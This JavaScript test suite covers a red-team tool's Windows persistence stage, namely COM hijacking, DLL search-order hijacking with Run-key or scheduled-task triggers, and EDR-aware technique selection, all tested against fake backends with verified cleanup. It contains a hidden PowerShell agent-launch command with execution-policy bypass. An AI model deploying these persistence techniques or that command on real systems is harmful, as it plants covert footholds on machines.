// deeppersist.test.mjs — the DEEP PERSISTENCE extension (stage 2) of the GOVERNED
// PERSISTENCE TIER: quieter user-land techniques (comhijack, dllsearch) with EDR-aware
// selection, trigger-model statements, and a benign resolve-proof — built on the
// tier's exact discipline (double gate, cleanup-proof, manifest, verified removal,
// escalation). Hermetic by default: the PS-host layer is an injected runner and the
// technique backends are injected stores, so the COM candidate classifier
// (shadow-vs-safe), the deep plan/manifest/cleanup over fake registry+file backends
// (refused-clobber, journal restore, verified removal, remove-failed escalation), the
// EDR-aware ranking matrix (posture fixtures => expected order), the trigger-model
// statements, and the secret/foreign-value safety are all pinned without spawning a
// process or touching the real registry/scheduler/filesystem-for-real.
//
// HOUSE RULE (absolute): payload-class test artifacts live under repo-local varvel/.tmp/
// (created with mkdirSync recursive) — NEVER os.tmpdir().
//
// The LAST test is the GUARDED LIVE path (opt-in): set VARVEL_LIVE_PERSIST=1 to spawn a
// THROWAWAY powershell child running the real persist host, install a SAFE
// ABANDONED-CLASS COM HIJACK (a made-up CLSID probed absent from BOTH hives first)
// pointing at an inert artifact under .tmp, run the benign RESOLVE-PROOF (a throwaway
// child instantiates the CLSID — the hijack provably resolves and the child exits
// cleanly), then remove, verify-absent at the registry level, and sweep clean —
// self-cleaning even on failure (try/finally). Default: SKIP. On THIS machine,
// user-context only; NOTHING touches HKLM.
//
// Settings discipline (house pattern): VARVEL_SETTINGS_FILE points under .tmp for THIS
// process and every engagement name is unique.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import { mkdtempSync, mkdirSync, existsSync, writeFileSync, rmSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { spawnSync } from 'node:child_process';
import { CallbackChannel } from '../engine/callback.mjs';
import {
  PERSIST_TECHNIQUES, PERSIST_DEEP_TECHNIQUES, PERSIST_ALL_TECHNIQUES,
  PERSIST_CLSID_RE, PERSIST_COM_ROOT, PERSIST_RUNKEY_PATH,
  PERSIST_TELEMETRY, PERSIST_TRIGGER_MODELS,
  parsePersistSpec, persistGate, persistTag, persistLocation, persistSpecSha256,
  comHijackLocation, dllSearchPlan, deepPrimaryLocation, deepEntryKey,
  classifyComCandidate, parseDeepParams, postureFromMeasurements, rankPersistTechniques,
  PersistStore, parsePersistEvidence, assessEngagementClean,
} from '../engine/persist.mjs';
import { runPersistTask, powerShellPersistRunner, PERSIST_HOST_PATH } from '../agents/persist.mjs';
import { Settings } from '../engine/settings.mjs';
import { selectPersistTechniques, buildPersistPostureCommand, parsePersistPosture } from '../tools/persist.mjs';

// HOUSE RULE: everything this suite writes lives under repo-local .tmp (gitignored,
// Defender-excluded) — never os.tmpdir().
const TMP_ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '.tmp');
mkdirSync(TMP_ROOT, { recursive: true });
const WORK = mkdtempSync(join(TMP_ROOT, 'deeppersist-test-'));
process.env.VARVEL_SETTINGS_FILE = join(WORK, 'settings.json');

const sha256 = (buf) => crypto.createHash('sha256').update(buf).digest('hex');
let engSeq = 0;
const freshEng = () => 'deeppersist-' + (engSeq++) + '-' + Date.now();

const TAG = 'VARVEL-deep01';
const TARGET = '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\\range\\varvel-agent.ps1" -Url "http://127.0.0.1:8971" -AgentId "a1" -Token "deadbeef"';
const CLSID = '{9B1F4D2E-6A3C-4E7B-A5D8-1C2E3F4A5B6C}';
const CLSID2 = '{4C8E2A1F-7B5D-4F3C-9E6A-2D8B5C1F3A7E}';
const DLL = 'C:\\sbx\\payload.dll';
const HOST = 'C:\\Windows\\System32\\fodhelper.exe';
const DLL_SHA = 'a'.repeat(64);
const HOST_SHA = 'b'.repeat(64);

// A fake deep backend standing in for the registry / Task Scheduler / filesystem —
// the technique implementations never touch the real ones from Node.
function deepBackend({ reg = {}, files = {}, clsidFacts = {} } = {}) {
  const regm = new Map(Object.entries(reg));
  const filem = new Map(Object.entries(files)); // path -> fake content hash
  return {
    reg: regm, files: filem,
    probe: (loc) => (regm.has(loc) ? { present: true, value: regm.get(loc) } : { present: false, value: null }),
    apply: (loc, v) => { regm.set(loc, String(v)); },
    remove: (loc) => { regm.delete(loc); },
    probeFile: (p) => (filem.has(p) ? { present: true, sha256: filem.get(p) } : { present: false, sha256: null }),
    plantFile: (p, from) => { if (!filem.has(from)) throw new Error('plant source missing: ' + from); filem.set(p, filem.get(from)); },
    removeFile: (p) => { filem.delete(p); },
    removeDir: () => {},
    probeClsid: (clsid) => clsidFacts[String(clsid).toUpperCase()] || { hklm: { present: false, value: null }, hkcu: { present: false, value: null } },
  };
}
const stdFiles = () => ({ [DLL]: DLL_SHA, [HOST]: HOST_SHA });

// The deep fake host: mirrors the ==PERSIST-LIB== job semantics (entry-key expansion,
// deep params + prove riding the job) over the REAL state machine (PersistStore).
function deepHostFromStore(backend, { sandbox = 'C:\\sbx' } = {}) {
  const stores = new Map();
  return async (jobJson) => {
    const job = JSON.parse(jobJson);
    const target = job.target || TARGET;
    const tag = job.name || persistTag(target);
    if (!stores.has(tag)) stores.set(tag, new PersistStore({ backend, tag, target, sandbox }));
    const store = stores.get(tag);
    if (job.op === 'audit') {
      const a = store.audit();
      return { stdout: JSON.stringify({ op: 'audit', pid: 4321, state: a.clean ? 'clean' : 'unclean', clean: a.clean, entries: a.entries, open: a.open, note: a.note, at: new Date().toISOString() }), stderr: '' };
    }
    const techniques = {};
    const techs = job.techniques && job.techniques.length ? job.techniques : PERSIST_ALL_TECHNIQUES;
    for (const t of techs) {
      if (PERSIST_DEEP_TECHNIQUES.includes(t)) {
        const key = job.deep ? deepEntryKey(t, job.deep) : t;
        techniques[key] = job.op === 'install' ? store.install(t, { overwrite: job.overwrite === true, deep: job.deep || null })
          : job.op === 'remove' ? store.remove(t, { deep: job.deep || null })
          : store.status(t, { deep: job.deep || null, prove: job.prove === true });
      } else {
        techniques[t] = job.op === 'install' ? store.install(t, { overwrite: job.overwrite === true })
          : job.op === 'remove' ? store.remove(t)
          : store.status(t);
      }
    }
    const states = Object.values(techniques).map((e) => e.state);
    const agg = states.some((s) => s === 'failed' || s === 'removal-failed') ? 'failed'
      : states.some((s) => s === 'refused-clobber' || s === 'refused-foreign') ? 'refused'
      : job.op === 'install' ? 'installed' : job.op === 'remove' ? 'removed'
      : states.every((s) => s === 'installed') ? 'installed' : states.every((s) => s === 'absent' || s === 'removed') ? 'absent' : 'mixed';
    return { stdout: JSON.stringify({ op: job.op, pid: 4321, state: agg, techniques, at: new Date().toISOString() }), stderr: '' };
  };
}

// ---------------- spec parse: the deep matrix ----------------
test('parsePersistSpec: deep installs parse (params validated + normalized); classic shapes unchanged', () => {
  const com = parsePersistSpec('persist-install', JSON.stringify({ techniques: ['comhijack'], name: 'OpX', deep: { clsid: CLSID.toLowerCase(), dll: DLL } }));
  assert.deepEqual(com, { kind: 'persist-install', techniques: ['comhijack'], name: 'OpX', overwrite: false, deep: { technique: 'comhijack', clsid: CLSID.toUpperCase(), dll: DLL } });
  const ds = parsePersistSpec('persist-install', JSON.stringify({ techniques: ['dllsearch'], deep: { host: HOST, as: 'APPHELP.dll', dll: DLL } }));
  assert.deepEqual(ds.deep, { technique: 'dllsearch', host: HOST, dll: DLL, as: 'apphelp.dll', trigger: 'runkey' }, 'the trigger defaults to runkey; the hijack name case-folds');
  // status with prove; deep params optional on status/remove (the manifest carries them)
  assert.deepEqual(parsePersistSpec('persist-status', JSON.stringify({ techniques: ['comhijack'], prove: true })),
    { kind: 'persist-status', techniques: ['comhijack'], name: null, prove: true });
  assert.deepEqual(parsePersistSpec('persist-remove', JSON.stringify({ techniques: ['comhijack'] })),
    { kind: 'persist-remove', techniques: ['comhijack'], all: false, name: null });
  // classic results carry NO deep key (back-compat pinned)
  assert.deepEqual(parsePersistSpec('persist-install', '{"techniques":["runkey","startup"],"overwrite":true}'),
    { kind: 'persist-install', techniques: ['runkey', 'startup'], name: null, overwrite: true });
});

test('parsePersistSpec: every malformed deep spec refuses loudly (nothing installs)', () => {
  assert.throws(() => parsePersistSpec('persist-install', '{"techniques":["comhijack"]}'), /needs a "deep" params object/);
  assert.throws(() => parsePersistSpec('persist-install', '{"techniques":["comhijack"],"deep":{"clsid":"not-a-guid","dll":"C:\\\\x\\\\p.dll"}}'), /not a CLSID/);
  assert.throws(() => parsePersistSpec('persist-install', '{"techniques":["comhijack"],"deep":{"clsid":"' + CLSID + '","dll":"relative\\\\p.dll"}}'), /ABSOLUTE Windows path/);
  assert.throws(() => parsePersistSpec('persist-install', '{"techniques":["comhijack"],"deep":{"clsid":"' + CLSID + '","dll":"C:\\\\x\\\\p.exe"}}'), /must end in/);
  assert.throws(() => parsePersistSpec('persist-install', '{"techniques":["comhijack"],"deep":{"clsid":"' + CLSID + '","dll":"C:\\\\x\\\\..\\\\p.dll"}}'), /must not contain/);
  assert.throws(() => parsePersistSpec('persist-install', '{"techniques":["dllsearch"],"deep":{"host":"C:\\\\w\\\\h.exe","as":"evil.dll","dll":"C:\\\\x\\\\p.dll"}}'), /deep\.as must be one of/, 'the hijack-name allowlist is the execproxy stage-1 set, reused');
  assert.throws(() => parsePersistSpec('persist-install', '{"techniques":["dllsearch"],"deep":{"host":"C:\\\\w\\\\h.exe","as":"apphelp.dll","dll":"C:\\\\x\\\\p.dll","trigger":"startup"}}'), /deep\.trigger must be one of/);
  assert.throws(() => parsePersistSpec('persist-install', '{"techniques":["runkey"],"deep":{"clsid":"' + CLSID + '","dll":"C:\\\\x\\\\p.dll"}}'), /require a deep technique/);
  assert.throws(() => parsePersistSpec('persist-install', '{"techniques":["comhijack","runkey"],"deep":{"clsid":"' + CLSID + '","dll":"C:\\\\x\\\\p.dll"}}'), /installs ALONE/, 'a deep technique never mixes with classic in one install');
  assert.throws(() => parsePersistSpec('persist-install', '{"techniques":["comhijack","dllsearch"],"deep":{}}'), /installs ALONE/, 'never two deep techniques at once');
  assert.throws(() => parsePersistSpec('persist-install', '{"techniques":["comhijack"],"deep":{"clsid":"' + CLSID + '","dll":"C:\\\\x\\\\p.dll"},"prove":true}'), /prove is a persist-status flag/);
  assert.throws(() => parsePersistSpec('persist-status', '{"techniques":["runkey"],"prove":true}'), /prove applies to comhijack/);
  assert.throws(() => parsePersistSpec('persist-remove', '{"all":true,"deep":{"clsid":"' + CLSID + '","dll":"C:\\\\x\\\\p.dll"}}'), /meaningless with all:true/);
  // the standing boundary still bites
  assert.throws(() => parsePersistSpec('persist-install', '{"techniques":["winlogon-shell"]}'), /unknown technique/, 'winlogon shell/userinit is CONSIDERED AND SKIPPED (system-adjacent) — documented boundary');
  assert.throws(() => parsePersistSpec('persist-install', '{"techniques":["wmi-sub"]}'), /unknown technique/, 'WMI subscriptions remain OUT');
  assert.throws(() => parsePersistSpec('persist-install', '{"techniques":["hklm-run"]}'), /unknown technique/, 'HKLM hives remain OUT');
});

// ---------------- COM candidate classifier (shadow-vs-safe) ----------------
test('classifyComCandidate: safe-abandoned vs shadow vs occupied-user; unprobed is unknown (never guessed)', () => {
  const safe = classifyComCandidate({ clsid: CLSID, hklm: { present: false, value: null }, hkcu: { present: false, value: null } });
  assert.equal(safe.classification, 'safe-abandoned');
  assert.equal(safe.shadow, false);
  assert.match(safe.note, /quiet BECAUSE nothing uses it|opportunistic/, 'the honest trigger tension is stated');
  const shadow = classifyComCandidate({ clsid: CLSID, hklm: { present: true, value: 'C:\\Windows\\System32\\real.dll' }, hkcu: { present: false, value: null } });
  assert.equal(shadow.classification, 'shadow');
  assert.equal(shadow.shadow, true);
  assert.match(shadow.impact, /SHADOWS the machine-wide/);
  assert.match(shadow.impact, /HIGHER IMPACT/, 'a shadow hijack is flagged as behavior-altering');
  assert.match(shadow.impact, /HKLM is never touched/, 'removal un-shadows; HKLM is never written');
  const occ = classifyComCandidate({ clsid: CLSID, hklm: { present: false, value: null }, hkcu: { present: true, value: 'C:\\foreign\\their.dll' }, ourValue: DLL });
  assert.equal(occ.classification, 'occupied-user');
  assert.equal(occ.ours, false);
  assert.match(occ.impact, /never clobbered silently/);
  const ours = classifyComCandidate({ clsid: CLSID, hklm: { present: false, value: null }, hkcu: { present: true, value: DLL }, ourValue: DLL });
  assert.equal(ours.ours, true, 'value-identified as ours — the idempotent case');
  const unknown = classifyComCandidate({ clsid: CLSID, hklm: null, hkcu: { present: false, value: null } });
  assert.equal(unknown.classification, 'unknown', 'an unprobed hive is never guessed');
  assert.throws(() => classifyComCandidate({ clsid: 'bogus', hklm: null, hkcu: null }), /not a CLSID/);
  assert.throws(() => classifyComCandidate({ hklm: null, hkcu: null }), /not a CLSID/);
});

// ---------------- deep plan helpers ----------------
test('deep plans: comhijack location; dllsearch reuses the execproxy sideload file set verbatim', () => {
  assert.equal(comHijackLocation(CLSID.toLowerCase()), PERSIST_COM_ROOT + '\\' + CLSID + '\\InprocServer32', 'the CLSID canonicalizes uppercase');
  assert.match(CLSID, PERSIST_CLSID_RE);
  const plan = dllSearchPlan({ host: HOST, as: 'apphelp.dll', dll: DLL, trigger: 'runkey', tag: TAG, sandbox: 'C:\\sbx' });
  assert.equal(plan.plantDir, 'C:\\sbx\\persist-dllsearch-' + TAG);
  assert.equal(plan.hostCopy, plan.plantDir + '\\fodhelper.exe');
  assert.equal(plan.trigger.location, PERSIST_RUNKEY_PATH + '\\' + TAG, 'the trigger rides the classic runkey location');
  assert.equal(plan.trigger.value, '"' + plan.hostCopy + '"', 'the trigger points at the COPY, never the original');
  // THE REUSE: the exact file set of the execproxy sideload registry
  assert.deepEqual(plan.files.map((f) => f.role), ['host-copy', 'dll-as', 'payload']);
  assert.equal(plan.files[0].copyFrom, HOST);
  assert.equal(plan.files[1].copyFrom, DLL);
  // schtask trigger + journaled-object trigger normalization
  const plan2 = dllSearchPlan({ host: HOST, as: 'apphelp.dll', dll: DLL, trigger: 'schtask', tag: TAG, sandbox: 'C:\\sbx' });
  assert.equal(plan2.trigger.location, '\\' + TAG);
  const plan3 = dllSearchPlan({ host: HOST, as: 'apphelp.dll', dll: DLL, trigger: { technique: 'schtask', location: '\\' + TAG }, tag: TAG, sandbox: 'C:\\sbx' });
  assert.equal(plan3.trigger.technique, 'schtask', 'a journaled trigger object normalizes back to the name');
  assert.equal(deepPrimaryLocation('comhijack', { clsid: CLSID }, TAG), comHijackLocation(CLSID));
  assert.equal(deepPrimaryLocation('dllsearch', { host: HOST, as: 'apphelp.dll', dll: DLL, trigger: 'runkey' }, TAG, 'C:\\sbx'), PERSIST_RUNKEY_PATH + '\\' + TAG);
  assert.equal(deepEntryKey('comhijack', { clsid: CLSID }), 'comhijack-9B1F4D2E', 'comhijack keys per-CLSID — several hijacks coexist under one name handle');
  assert.equal(deepEntryKey('comhijack', { clsid: CLSID2 }), 'comhijack-4C8E2A1F');
  assert.equal(deepEntryKey('dllsearch', {}), 'dllsearch', 'dllsearch keys per name handle (locations are name-derived)');
  assert.throws(() => persistLocation('comhijack', TAG), /parameter-derived/, 'persistLocation refuses deep techniques honestly');
  assert.throws(() => parseDeepParams('comhijack', null, 'k'), /needs a "deep" params object/);
});

// ---------------- PersistStore deep legs: the cleanup-proof contract, pinned hermetically ----------------
test('comhijack install: classified (safe-abandoned), payload-hashed, verified by re-read; manifest journals clsid+classification', () => {
  const backend = deepBackend({ files: stdFiles() });
  const store = new PersistStore({ backend, tag: TAG, target: TARGET, sandbox: 'C:\\sbx' });
  const ev = store.install('comhijack', { deep: { technique: 'comhijack', clsid: CLSID, dll: DLL } });
  assert.equal(ev.state, 'installed');
  assert.equal(ev.installVerified, true);
  assert.equal(ev.classification, 'safe-abandoned');
  assert.equal(ev.shadow, false);
  assert.equal(ev.dllSha256, DLL_SHA, 'the payload bytes hash is evidenced');
  assert.equal(ev.location, comHijackLocation(CLSID));
  assert.equal(backend.probe(ev.location).value, DLL, 'the hijack points at the payload path');
  assert.match(ev.triggerModel, /NOT a guaranteed timer/, 'the trigger model rides the evidence, honestly');
  const entry = store.manifest.entries['comhijack-9B1F4D2E'];
  assert.ok(entry, 'the manifest entry keys per-CLSID');
  assert.equal(entry.deep.clsid, CLSID);
  assert.equal(entry.deep.classification, 'safe-abandoned');
  assert.equal(entry.deep.dllSha256, DLL_SHA);
  // idempotent re-install
  const ev2 = store.install('comhijack', { deep: { technique: 'comhijack', clsid: CLSID, dll: DLL } });
  assert.equal(ev2.state, 'installed');
  assert.match(ev2.note, /idempotent/);
  // a second CLSID coexists under the same name handle
  const ev3 = store.install('comhijack', { deep: { technique: 'comhijack', clsid: CLSID2, dll: DLL } });
  assert.equal(ev3.state, 'installed');
  assert.ok(store.manifest.entries['comhijack-4C8E2A1F']);
  assert.ok(store.manifest.entries['comhijack-9B1F4D2E'], 'the first hijack entry survives the second install');
  // no payload -> no write (cleanup doctrine)
  const store2 = new PersistStore({ backend: deepBackend({ files: { [HOST]: HOST_SHA } }), tag: TAG, target: TARGET });
  const nope = store2.install('comhijack', { deep: { technique: 'comhijack', clsid: CLSID, dll: DLL } });
  assert.equal(nope.state, 'failed');
  assert.match(nope.error, /payload DLL not found|unhashable/);
  assert.equal(backend2Present(store2), false, 'nothing was written');
});
function backend2Present(store) {
  const e = store.manifest.entries['comhijack-9B1F4D2E'];
  return !!(e && e.state === 'installed');
}

test('comhijack shadow install: an HKLM-registered class is SHADOWED — flagged loudly in evidence + journal', () => {
  const backend = deepBackend({
    files: stdFiles(),
    clsidFacts: { [CLSID]: { hklm: { present: true, value: 'C:\\Windows\\System32\\real.dll' }, hkcu: { present: false, value: null } } },
  });
  const store = new PersistStore({ backend, tag: TAG, target: TARGET });
  const ev = store.install('comhijack', { deep: { technique: 'comhijack', clsid: CLSID, dll: DLL } });
  assert.equal(ev.state, 'installed');
  assert.equal(ev.classification, 'shadow');
  assert.equal(ev.shadow, true);
  assert.match(ev.note, /SHADOW install/);
  assert.match(ev.note, /HIGHER IMPACT/);
  assert.equal(store.manifest.entries['comhijack-9B1F4D2E'].deep.shadow, true, 'the shadow flag is journaled');
  const rem = store.remove('comhijack', { deep: { technique: 'comhijack', clsid: CLSID, dll: DLL } });
  assert.equal(rem.state, 'removed');
  assert.match(rem.note, /UN-SHADOWED/, 'removal un-shadows — HKLM was never touched');
});

test('comhijack clobber doctrine: foreign InprocServer32 refuses; overwrite journals; remove RESTORES the foreign value', () => {
  const loc = comHijackLocation(CLSID);
  const OLD = 'C:\\Users\\range\\AppData\\Local\\old-server.dll';
  const backend = deepBackend({
    files: stdFiles(),
    reg: { [loc]: OLD },
    clsidFacts: { [CLSID]: { hklm: { present: false, value: null }, hkcu: { present: true, value: OLD } } },
  });
  const store = new PersistStore({ backend, tag: TAG, target: TARGET });
  const ref = store.install('comhijack', { deep: { technique: 'comhijack', clsid: CLSID, dll: DLL } });
  assert.equal(ref.state, 'refused-clobber');
  assert.equal(ref.classification, 'occupied-user');
  assert.match(ref.note, /REFUSED to clobber/);
  assert.equal(backend.probe(loc).value, OLD, 'the foreign value was NOT touched');
  const ins = store.install('comhijack', { overwrite: true, deep: { technique: 'comhijack', clsid: CLSID, dll: DLL } });
  assert.equal(ins.state, 'installed');
  assert.equal(ins.overwriteJournaled, true);
  const rem = store.remove('comhijack', { deep: { technique: 'comhijack', clsid: CLSID, dll: DLL } });
  assert.equal(rem.state, 'removed');
  assert.equal(rem.journalRestored, true);
  assert.equal(rem.removalVerified, true);
  assert.equal(backend.probe(loc).value, OLD, 'the location provably holds what it held BEFORE install');
});

test('comhijack removal verifies absence; foreign values are never deleted; removal-failure is LOUD + swept open', () => {
  const loc = comHijackLocation(CLSID);
  const backend = deepBackend({ files: stdFiles() });
  const store = new PersistStore({ backend, tag: TAG, target: TARGET });
  store.install('comhijack', { deep: { technique: 'comhijack', clsid: CLSID, dll: DLL } });
  // tamper detection
  backend.apply(loc, 'C:\\evil\\other.dll');
  assert.equal(store.status('comhijack', { deep: { technique: 'comhijack', clsid: CLSID, dll: DLL } }).state, 'tampered');
  backend.apply(loc, DLL);
  // a foreign value we never installed is REFUSED
  const storeF = new PersistStore({ backend: deepBackend({ files: stdFiles(), reg: { [loc]: 'C:\\someone-else\\thing.dll' } }), tag: TAG, target: TARGET });
  const remF = storeF.remove('comhijack', { deep: { technique: 'comhijack', clsid: CLSID, dll: DLL } });
  assert.equal(remF.state, 'refused-foreign');
  assert.match(remF.note, /REFUSED to remove what we did not write/);
  // removal-failure: a store whose deletes never take
  const sticky = {
    probe: (l) => (l === loc ? { present: true, value: DLL } : { present: false, value: null }),
    apply: () => {}, remove: () => {},
    probeFile: (p) => (p === DLL ? { present: true, sha256: DLL_SHA } : { present: false, sha256: null }),
    plantFile: () => {}, removeFile: () => {}, removeDir: () => {},
    probeClsid: () => ({ hklm: { present: false, value: null }, hkcu: { present: false, value: null } }),
  };
  const storeS = new PersistStore({ backend: sticky, tag: TAG, target: TARGET });
  assert.equal(storeS.install('comhijack', { deep: { technique: 'comhijack', clsid: CLSID, dll: DLL } }).state, 'installed');
  const remS = storeS.remove('comhijack', { deep: { technique: 'comhijack', clsid: CLSID, dll: DLL } });
  assert.equal(remS.state, 'removal-failed', 'the unverifiable removal is a first-class loud failure');
  assert.match(remS.error, /STILL PRESENT|CLEANUP-PROOF FAILED/);
  const sweep = storeS.audit();
  assert.equal(sweep.clean, false, 'the sweep never calls an unverified removal clean');
  assert.equal(sweep.open.length, 1);
  assert.equal(sweep.open[0].technique, 'comhijack');
  // and the verified remove + clean sweep
  const rem = store.remove('comhijack', { deep: { technique: 'comhijack', clsid: CLSID, dll: DLL } });
  assert.equal(rem.state, 'removed');
  assert.equal(rem.removalVerified, true);
  assert.equal(backend.probe(loc).present, false);
  assert.equal(store.audit().clean, true);
});

test('dllsearch install: plants sha256-verified + trigger armed last + journaled; foreign plant bytes refuse (never journaled)', () => {
  const backend = deepBackend({ files: stdFiles() });
  const store = new PersistStore({ backend, tag: TAG, target: TARGET, sandbox: 'C:\\sbx' });
  const deep = { technique: 'dllsearch', host: HOST, as: 'apphelp.dll', dll: DLL, trigger: 'runkey' };
  const ev = store.install('dllsearch', { deep });
  assert.equal(ev.state, 'installed');
  assert.equal(ev.installVerified, true);
  assert.equal(ev.dllSha256, DLL_SHA);
  assert.equal(ev.hostSha256, HOST_SHA);
  const plan = dllSearchPlan({ ...deep, tag: TAG, sandbox: 'C:\\sbx' });
  assert.equal(ev.plantDir, plan.plantDir);
  assert.equal(ev.trigger.location, plan.trigger.location);
  assert.equal(ev.files.length, 2);
  assert.ok(ev.files.every((f) => f.planted && f.present));
  assert.equal(backend.files.get(plan.hostCopy), HOST_SHA, 'the host COPY landed (the original is never touched)');
  assert.equal(backend.files.get(plan.dllAs), DLL_SHA, 'the dll-as plant landed');
  assert.equal(backend.probe(plan.trigger.location).value, plan.trigger.value, 'the trigger points at the COPY');
  assert.match(ev.note, /MEASURED per engagement/, 'whether the copy actually loads the planted name is measured, never claimed');
  assert.match(ev.triggerModel, /two-stage/);
  const entry = store.manifest.entries.dllsearch;
  assert.equal(entry.deep.trigger.value, plan.trigger.value);
  assert.equal(entry.deep.files.length, 2);
  // status: installed + intact
  const st = store.status('dllsearch', { deep });
  assert.equal(st.state, 'installed');
  assert.ok(st.files.every((f) => f.state === 'planted'));
  // foreign plant bytes -> refused-clobber, files never journaled/overwritten
  const clash = deepBackend({ files: { ...stdFiles(), [plan.hostCopy]: 'f'.repeat(64) } });
  const store2 = new PersistStore({ backend: clash, tag: TAG, target: TARGET, sandbox: 'C:\\sbx' });
  const ref = store2.install('dllsearch', { deep });
  assert.equal(ref.state, 'refused-clobber');
  assert.match(ref.error, /FOREIGN bytes/);
  assert.equal(clash.files.get(plan.hostCopy), 'f'.repeat(64), 'the foreign bytes survived');
  // remove still takes the journaled partial state back
  const rem2 = store2.remove('dllsearch', { deep });
  assert.ok(['removed', 'refused-foreign'].includes(rem2.state));
  assert.equal(clash.files.get(plan.hostCopy), 'f'.repeat(64), 'removal refuses to delete foreign bytes (loud, not silent)');
});

test('dllsearch trigger clobber: a foreign trigger value refuses (plants journaled); overwrite journals; remove RESTORES the trigger then deletes plants', () => {
  const deep = { technique: 'dllsearch', host: HOST, as: 'apphelp.dll', dll: DLL, trigger: 'runkey' };
  const plan = dllSearchPlan({ ...deep, tag: TAG, sandbox: 'C:\\sbx' });
  const OLD = 'C:\\Users\\range\\legit\\updater.exe /quiet';
  const backend = deepBackend({ files: stdFiles(), reg: { [plan.trigger.location]: OLD } });
  const store = new PersistStore({ backend, tag: TAG, target: TARGET, sandbox: 'C:\\sbx' });
  const ref = store.install('dllsearch', { deep });
  assert.equal(ref.state, 'refused-clobber');
  assert.match(ref.note, /trigger location already holds a FOREIGN value/);
  assert.equal(backend.probe(plan.trigger.location).value, OLD, 'the foreign trigger survived');
  assert.ok(backend.files.has(plan.hostCopy), 'the plants landed BEFORE the trigger refused — and they are journaled for remove');
  assert.ok(store.manifest.entries.dllsearch.deep.files.length >= 1, 'the partial plant is journaled (cleanup doctrine: what was planted is always take-back-able)');
  // overwrite: the trigger value journals; remove restores it AND deletes the plants
  const ins = store.install('dllsearch', { overwrite: true, deep });
  assert.equal(ins.state, 'installed');
  assert.equal(ins.overwriteJournaled, true);
  const rem = store.remove('dllsearch', { deep });
  assert.equal(rem.state, 'removed');
  assert.equal(rem.journalRestored, true, 'the journaled trigger value was restored, not deleted');
  assert.equal(rem.removalVerified, true);
  assert.equal(backend.probe(plan.trigger.location).value, OLD, 'the trigger provably holds what it held before install');
  assert.equal(backend.files.has(plan.hostCopy), false, 'every planted file is gone');
  assert.equal(backend.files.has(plan.dllAs), false);
  assert.equal(store.audit().clean, true);
});

test('dllsearch removal-failure is LOUD and swept open; a stuck file is never assumed gone', () => {
  const deep = { technique: 'dllsearch', host: HOST, as: 'apphelp.dll', dll: DLL, trigger: 'runkey' };
  const plan = dllSearchPlan({ ...deep, tag: TAG, sandbox: 'C:\\sbx' });
  // a backend whose file deletes silently fail (a locked plant: the copied host still running)
  const filem = new Map(Object.entries(stdFiles()));
  const sticky = {
    probe: (l) => ({ present: false, value: null }),
    apply: (l, v) => {}, remove: (l) => {},
    probeFile: (p) => (filem.has(p) ? { present: true, sha256: filem.get(p) } : { present: false, sha256: null }),
    plantFile: (p, from) => { filem.set(p, filem.get(from)); },
    removeFile: () => {}, // the delete silently does nothing
    removeDir: () => {},
    probeClsid: () => ({ hklm: { present: false, value: null }, hkcu: { present: false, value: null } }),
  };
  const regm = new Map();
  sticky.probe = (l) => (regm.has(l) ? { present: true, value: regm.get(l) } : { present: false, value: null });
  sticky.apply = (l, v) => { regm.set(l, String(v)); };
  sticky.remove = (l) => { regm.delete(l); };
  const store = new PersistStore({ backend: sticky, tag: TAG, target: TARGET, sandbox: 'C:\\sbx' });
  assert.equal(store.install('dllsearch', { deep }).state, 'installed');
  const rem = store.remove('dllsearch', { deep });
  assert.equal(rem.state, 'removal-failed');
  assert.match(rem.error, /STILL PRESENT|CLEANUP-PROOF FAILED/);
  const sweep = store.audit();
  assert.equal(sweep.clean, false);
  assert.equal(sweep.open.length, 1);
  assert.equal(sweep.open[0].technique, 'dllsearch');
});

test('deep status without params or entry is honest (nothing locatable); remove is verified-clean of anything recorded', () => {
  const store = new PersistStore({ backend: deepBackend({ files: stdFiles() }), tag: TAG, target: TARGET });
  const st = store.status('comhijack');
  assert.equal(st.state, 'absent');
  assert.match(st.note, /parameter-derived/);
  assert.match(st.triggerModel, /CoCreateInstance/);
  const rem = store.remove('dllsearch');
  assert.equal(rem.state, 'removed');
  assert.equal(rem.removalVerified, true);
  assert.match(rem.note, /verified clean|nothing locatable/);
});

// ---------------- evidence parse: deep fields ride the audit; escalation parity ----------------
test('parsePersistEvidence: deep fields (clsid/classification/shadow/files/resolveProof) land in audit; remove-failed escalates identically', async () => {
  const backend = deepBackend({ files: stdFiles() });
  const runner = deepHostFromStore(backend);
  const mpath = join(WORK, 'm-deep.json');
  const deep = { clsid: CLSID, dll: DLL };
  const inRaw = await runPersistTask('persist-install', JSON.stringify({ techniques: ['comhijack'], name: TAG, deep }), { runner, target: TARGET, defaultName: TAG, manifestPath: mpath });
  const job = JSON.parse(inRaw);
  assert.equal(job.op, 'install');
  assert.ok(job.techniques['comhijack-9B1F4D2E'], 'the result keys per-CLSID like the PS twin');
  const ev1 = parsePersistEvidence(inRaw);
  assert.equal(ev1.event, 'persist.installed');
  const row = ev1.fields.techniques['comhijack-9B1F4D2E'];
  assert.equal(row.state, 'installed');
  assert.equal(row.clsid, CLSID);
  assert.equal(row.classification, 'safe-abandoned');
  assert.equal(row.dllSha256, DLL_SHA);
  assert.match(row.triggerModel, /NOT a guaranteed timer/);
  assert.equal(row.installVerified, true);
  // a status with a proof outcome rides too
  const proofRunner = async () => ({
    stdout: JSON.stringify({ op: 'status', pid: 1, state: 'installed', techniques: { 'comhijack-9B1F4D2E': { state: 'installed', technique: 'comhijack', location: comHijackLocation(CLSID), clsid: CLSID, classification: 'safe-abandoned', installVerified: true, triggerModel: PERSIST_TRIGGER_MODELS.comhijack, resolveProof: { attempted: true, resolved: true, hresult: '0x800700C1', childExited: true, childExitCode: 0 } } }, at: new Date().toISOString() }),
    stderr: '',
  });
  const stEv = parsePersistEvidence(await runPersistTask('persist-status', JSON.stringify({ techniques: ['comhijack'], prove: true }), { runner: proofRunner, target: TARGET, defaultName: TAG, manifestPath: mpath }));
  assert.equal(stEv.event, 'persist.status');
  assert.deepEqual(stEv.fields.techniques['comhijack-9B1F4D2E'].resolveProof, { attempted: true, resolved: true, hresult: '0x800700C1', childExited: true, childExitCode: 0 });
  // dllsearch evidence carries the plant manifest
